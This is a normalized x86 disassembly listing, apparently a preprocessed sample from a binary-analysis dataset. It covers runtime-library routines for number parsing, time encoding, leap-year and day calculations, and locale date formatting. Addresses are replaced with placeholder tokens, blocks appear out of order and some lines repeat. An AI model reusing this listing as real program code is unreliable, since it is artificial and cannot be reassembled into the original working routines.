jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409570
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409627
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409632
neg edx
mov ecx esi
call sub_409632
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409627
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40964e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d70
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409632
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40964e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409684
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409070
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40405c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4096b4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409070
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40405c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4096e4
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esp
xor ecx ecx
call sub_409570
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e48
sub_40973c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esp
xor ecx ecx
call sub_409570
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409768
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esp
xor ecx ecx
call sub_409570
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4097b0
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4097f4
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4097f4
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407e30
sub_4098a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4097b0
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407e14
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407e14
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407e14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409900
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_40993c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409900
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409a04
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_40993c
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407e30
sub_409a34
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4097b0
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407e14
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407e14
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407e14
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409900
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409b80
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409a34
pop esi
pop ecx
pop ebp
retn 0x8
sub_409ba0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4097b0
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409bdc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_402988
sub_409c20
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40422c
mov edx eax
mov eax ebx
call sub_409bdc
pop ecx
pop ebx
pop ebp
retn
sub_409c40
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408b60
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409bdc
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409c8c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409cb8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409b80
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409cf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4098a4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409d30
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409e7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f6c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409e85
lea eax [ ebp - 0x118 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041dc
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40422c
mov edx eax
mov eax [ ebx ]
call sub_40c2fc
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c470
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_40448c
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c40c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404164
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c470
mov ecx eax
mov eax ebx
mov edx esi
call sub_40405c
sub_409e98
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409f76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f6c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409f7d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041dc
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40422c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40448c
sub_409fa0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a721
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a728
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f90
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c4f0
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c4d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409bdc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c4f0
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409bdc
pop ecx
mov al [ eax + lookup_table_40a083 ]
jmp [ eax * 4 + jump_table_40a0bc ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cb8
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cb8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409d30
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409c20
pop ecx
jmp r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cb8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409e98
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409c20
pop ecx
jmp r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cb8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409c8c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cf0
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cf0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cf0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409c8c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409c8c
pop ecx
push ebp
call sub_409cf0
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409cf0
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4089d0
test eax eax
jne r-xdata
push ebp
call sub_409c8c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
push ebp
call sub_409cf0
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409c40
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409c40
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409c40
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409cb8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409c40
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409c40
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409c40
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409c40
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4089d0
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409bdc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409bdc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409bdc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409c20
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ba0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c20
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4089d0
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409bdc
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409bdc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409c20
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ba0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c20
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c4f0
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4089d0
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409bdc
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409c40
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4089d0
test eax eax
jne r-xdata
push ebp
call sub_409cb8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ba0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c20
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c20
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c20
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c4f0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409bdc
pop ecx
jmp r-xdata
push ebp
call sub_409cb8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ba0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409c20
